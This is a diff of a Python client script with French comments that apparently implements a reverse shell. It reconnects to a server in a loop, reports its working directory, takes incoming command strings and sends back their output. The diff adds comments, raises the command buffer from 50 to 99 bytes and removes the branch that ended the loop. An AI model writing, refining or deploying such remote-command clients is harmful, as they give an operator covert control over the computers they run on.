@@ -6,6 +6,7 @@ clearconsole = "cls"
 nothing = " ".encode()
 
 def connect():
+    #Boucle de connection si jamais le server n'est pas ouvert
     connection = True
     while connection is True:
         try:
@@ -14,20 +15,31 @@ def connect():
         except ConnectionRefusedError:
             time.sleep(3)
 
-    Clientboucle = True
+            
 
+    #Boucle principal apres que la connection ait été faite
+    Clientboucle = True
     while Clientboucle is True:
+
+        #envoie le path actuel
         jesuisou = os.getcwd().encode()
+
         try:
             connectionToServer.send(jesuisou)
+
+        #Try si jamais le serveur quitte de force
         except OSError:
+            #Il va essayer de se reconnecter au server
             connectionToServer.close()
             break
+
         try:
-            commande = connectionToServer.recv(50).decode()
+            commande = connectionToServer.recv(99).decode()
+            #Fix de certaine commande qui ne fonctionne pas de base
             if commande != "closeserverclient":
                 stderr = b''
                 stdout = b''
+
                 if 'cd' in commande:
                     derniereLettre = commande[-1]
                     directory = commande[3:-1]+derniereLettre
@@ -49,8 +61,8 @@ def connect():
                 connectionToServer.send(nothing)
             elif "" == commande:
                 connectionToServer.send(nothing)
-            else:
-                Clientboucle = False
+        
+        #Si le server quitte de force
         except ConnectionResetError:
             connectionToServer.close()
 
